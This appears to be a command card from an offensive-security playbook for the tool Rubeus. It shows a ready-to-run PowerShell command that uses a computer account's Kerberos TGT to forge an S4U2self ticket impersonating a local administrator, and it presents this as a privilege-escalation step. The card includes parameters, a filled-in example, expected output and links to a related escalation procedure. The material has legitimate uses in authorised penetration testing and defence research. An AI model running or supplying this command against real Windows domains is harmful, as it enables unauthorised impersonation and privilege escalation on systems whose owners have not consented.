---
id: 739dd119-6839-42b5-b9e3-63d7770f6bc8
name: rubeus-s4u-generate-s4u2self-ticket
type: command
executor: powershell
data: >-
  Rubeus.exe s4u /user:"$_COMPUTER_ACCOUNT" /msdsspn:"cifs/$_COMPUTER_DNS"
  /impersonateuser:"$_LOCAL_ADMIN" /ticket:"$_BASE64_TGT" /nowrap
output: null
created_at: '2023-04-06T03:56:07.821578+00:00'
updated_at: '2023-04-10T20:36:07.954586+00:00'
platforms:
  - Windows
tags:
  - kerberos
  - s4u
verified: true
validated: true
---

# rubeus-s4u-generate-s4u2self-ticket

## Command

```powershell
Rubeus.exe s4u /user:"$_COMPUTER_ACCOUNT" /msdsspn:"cifs/$_COMPUTER_DNS" /impersonateuser:"$_LOCAL_ADMIN" /ticket:"$_BASE64_TGT" /nowrap
```

## Description

Generates an S4U2self ticket using a computer account to impersonate a local admin, useful for server-specific escalation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /user:"$_COMPUTER_ACCOUNT" | Computer account name (e.g., SRV001$) | Yes |
| /msdsspn:"cifs/$_COMPUTER_DNS" | SPN for the computer (e.g., cifs/srv001.domain.local) | Yes |
| /impersonateuser:"$_LOCAL_ADMIN" | Local admin to impersonate | Yes |
| /ticket:"$_BASE64_TGT" | Base64 TGT | Yes |
| /nowrap | Plain ticket output | Yes |

## Examples

### Basic Usage

```powershell
Rubeus.exe s4u /user:"SRV001$" /msdsspn:"cifs/srv001.domain.local" /impersonateuser:"localadmin" /ticket:"doIF..." /nowrap
```

## Expected Output

```
[+] S4U ticket generated (may show proxy error but ticket is valid)
[+] Ticket: doIF... (base64)
```

## Related

- [[commands/rubeus-tgssub-modify-service-ptt]]
- [[procedures/Kerberos-S4U2Self-Privilege-Escalation]]
